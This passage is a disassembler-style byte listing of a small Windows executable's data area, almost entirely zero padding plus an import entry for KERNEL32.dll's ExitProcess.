		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  28h	; (
		db  50h	; P
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  38h	; 8
		db  50h	; P
		db    0	;  
		db    0	;  
		db  30h	; 0
		db  50h	; P
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  46h	; F
		db  50h	; P
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  46h	; F
		db  50h	; P
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  4Bh	; K
		db  45h	; E
		db  52h	; R
		db  4Eh	; N
		db  45h	; E
		db  4Ch	; L
		db  33h	; 3
		db  32h	; 2
		db  2Eh	; .
		db  64h	; d
		db  6Ch	; l
		db  6Ch	; l
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  45h	; E
		db  78h	; x
		db  69h	; i
		db  74h	; t
		db  50h	; P
		db  72h	; r
		db  6Fh	; o
		db  63h	; c
		db  65h	; e
		db  73h	; s
		db  73h	; s
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db  30h	; 0
		db    0	;  
		db    0	;  
		db  0Ch	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    2	;  
		db  30h	; 0
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
		db    0	;  
